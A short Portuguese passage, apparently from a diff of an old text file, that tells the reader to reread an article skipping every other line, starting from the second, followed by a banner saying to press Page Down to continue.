+por nenhum artigo, releia-o pulando uma linha (começe
+lendo pela SEGUNDA)
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
